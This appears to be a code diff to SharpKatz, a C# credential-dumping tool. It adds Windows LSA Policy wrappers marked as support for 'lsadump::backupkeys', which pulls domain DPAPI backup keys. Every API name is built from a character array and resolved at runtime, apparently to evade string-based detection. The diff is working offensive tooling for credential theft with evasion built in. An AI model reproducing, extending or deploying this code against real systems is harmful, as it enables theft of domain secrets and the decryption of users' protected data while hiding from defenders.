@@ -2730,5 +2730,113 @@ namespace SharpKatz.Win32
         public const uint CERT_STORE_CREATE_NEW_FLAG = 0x00002000;
         public const uint CERT_STORE_ADD_ALWAYS = 4;
         public const uint CERT_NAME_SIMPLE_DISPLAY_TYPE = 4;
+
+        // --- LSA Policy API (for lsadump::backupkeys) ---
+
+        // LSA access rights
+        public const uint POLICY_VIEW_LOCAL_INFORMATION = 0x00000001;
+        public const uint POLICY_VIEW_AUDIT_INFORMATION = 0x00000002;
+        public const uint POLICY_GET_PRIVATE_INFORMATION = 0x00000004;
+        public const uint POLICY_TRUST_ADMIN = 0x00000008;
+        public const uint POLICY_CREATE_ACCOUNT = 0x00000010;
+        public const uint POLICY_CREATE_SECRET = 0x00000020;
+        public const uint POLICY_CREATE_PRIVILEGE = 0x00000040;
+        public const uint POLICY_SET_DEFAULT_QUOTA_LIMITS = 0x00000080;
+        public const uint POLICY_SET_AUDIT_REQUIREMENTS = 0x00000100;
+        public const uint POLICY_AUDIT_LOG_ADMIN = 0x00000200;
+        public const uint POLICY_SERVER_ADMIN = 0x00000400;
+        public const uint POLICY_LOOKUP_NAMES = 0x00000800;
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct LSA_OBJECT_ATTRIBUTES
+        {
+            public uint Length;
+            public IntPtr RootDirectory;
+            public IntPtr ObjectName;
+            public uint Attributes;
+            public IntPtr SecurityDescriptor;
+            public IntPtr SecurityQualityOfService;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct LSA_UNICODE_STRING
+        {
+            public ushort Length;
+            public ushort MaximumLength;
+            public IntPtr Buffer;
+        }
+
+        public static uint LsaOpenPolicy(string systemName, ref LSA_OBJECT_ATTRIBUTES objectAttributes, uint desiredAccess, out IntPtr policyHandle)
+        {
+            IntPtr proc = GetProcAddress(GetAdvapi32(), new string(new char[] { 'L', 's', 'a', 'O', 'p', 'e', 'n', 'P', 'o', 'l', 'i', 'c', 'y' }));
+            SysCall.Delegates.LsaOpenPolicy LsaOpenPolicy = (SysCall.Delegates.LsaOpenPolicy)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.LsaOpenPolicy));
+
+            LSA_UNICODE_STRING systemNameStr = new LSA_UNICODE_STRING();
+            IntPtr sysNamePtr = IntPtr.Zero;
+            if (!string.IsNullOrEmpty(systemName))
+            {
+                systemNameStr.Length = (ushort)(systemName.Length * 2);
+                systemNameStr.MaximumLength = (ushort)(systemNameStr.Length + 2);
+                sysNamePtr = Marshal.StringToHGlobalUni(systemName);
+                systemNameStr.Buffer = sysNamePtr;
+            }
+
+            uint result;
+            if (sysNamePtr != IntPtr.Zero)
+            {
+                IntPtr lsaStr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(LSA_UNICODE_STRING)));
+                Marshal.StructureToPtr(systemNameStr, lsaStr, false);
+                result = LsaOpenPolicy(lsaStr, ref objectAttributes, desiredAccess, out policyHandle);
+                Marshal.FreeHGlobal(lsaStr);
+                Marshal.FreeHGlobal(sysNamePtr);
+            }
+            else
+            {
+                result = LsaOpenPolicy(IntPtr.Zero, ref objectAttributes, desiredAccess, out policyHandle);
+            }
+            return result;
+        }
+
+        public static uint LsaRetrievePrivateData(IntPtr policyHandle, string keyName, out IntPtr privateData)
+        {
+            IntPtr proc = GetProcAddress(GetAdvapi32(), new string(new char[] { 'L', 's', 'a', 'R', 'e', 't', 'r', 'i', 'e', 'v', 'e', 'P', 'r', 'i', 'v', 'a', 't', 'e', 'D', 'a', 't', 'a' }));
+            SysCall.Delegates.LsaRetrievePrivateData LsaRetrievePrivateData = (SysCall.Delegates.LsaRetrievePrivateData)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.LsaRetrievePrivateData));
+
+            LSA_UNICODE_STRING keyNameStr = new LSA_UNICODE_STRING();
+            keyNameStr.Length = (ushort)(keyName.Length * 2);
+            keyNameStr.MaximumLength = (ushort)(keyNameStr.Length + 2);
+            IntPtr keyNamePtr = Marshal.StringToHGlobalUni(keyName);
+            keyNameStr.Buffer = keyNamePtr;
+
+            IntPtr lsaStr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(LSA_UNICODE_STRING)));
+            Marshal.StructureToPtr(keyNameStr, lsaStr, false);
+
+            uint result = LsaRetrievePrivateData(policyHandle, lsaStr, out privateData);
+
+            Marshal.FreeHGlobal(lsaStr);
+            Marshal.FreeHGlobal(keyNamePtr);
+            return result;
+        }
+
+        public static uint LsaClose(IntPtr objectHandle)
+        {
+            IntPtr proc = GetProcAddress(GetAdvapi32(), new string(new char[] { 'L', 's', 'a', 'C', 'l', 'o', 's', 'e' }));
+            SysCall.Delegates.LsaClose LsaClose = (SysCall.Delegates.LsaClose)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.LsaClose));
+            return LsaClose(objectHandle);
+        }
+
+        public static uint LsaFreeMemory(IntPtr buffer)
+        {
+            IntPtr proc = GetProcAddress(GetAdvapi32(), new string(new char[] { 'L', 's', 'a', 'F', 'r', 'e', 'e', 'M', 'e', 'm', 'o', 'r', 'y' }));
+            SysCall.Delegates.LsaFreeMemory LsaFreeMemory = (SysCall.Delegates.LsaFreeMemory)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.LsaFreeMemory));
+            return LsaFreeMemory(buffer);
+        }
+
+        public static int LsaNtStatusToWinError(uint status)
+        {
+            IntPtr proc = GetProcAddress(GetAdvapi32(), new string(new char[] { 'L', 's', 'a', 'N', 't', 'S', 't', 'a', 't', 'u', 's', 'T', 'o', 'W', 'i', 'n', 'E', 'r', 'r', 'o', 'r' }));
+            SysCall.Delegates.LsaNtStatusToWinError LsaNtStatusToWinError = (SysCall.Delegates.LsaNtStatusToWinError)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.LsaNtStatusToWinError));
+            return LsaNtStatusToWinError(status);
+        }
     }
 }
